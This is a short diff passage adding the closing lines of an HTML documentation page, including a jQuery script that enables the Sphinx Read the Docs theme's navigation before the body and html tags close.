+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
